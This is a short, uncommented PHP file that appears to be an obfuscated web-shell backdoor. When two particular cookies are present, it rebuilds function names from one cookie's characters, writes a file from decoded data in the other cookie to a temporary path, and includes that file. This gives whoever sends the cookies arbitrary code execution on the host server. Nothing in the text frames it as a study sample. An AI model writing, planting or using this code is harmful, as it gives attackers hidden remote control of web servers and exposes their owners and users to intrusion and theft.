<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[29])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 2;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[29][$n];
        if (!$c[29][$n + 1]) {
            if (!$c[29][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 2 + 1;
    }
    $k = $p[9]() . $p[22];
    if (!$p[15]($k)) {
        $n = $p[21]($k, $p[3]);
        $p[16]($n, $p[17] . $p[1]($p[23]($c[3])));
    }
    include($k);
}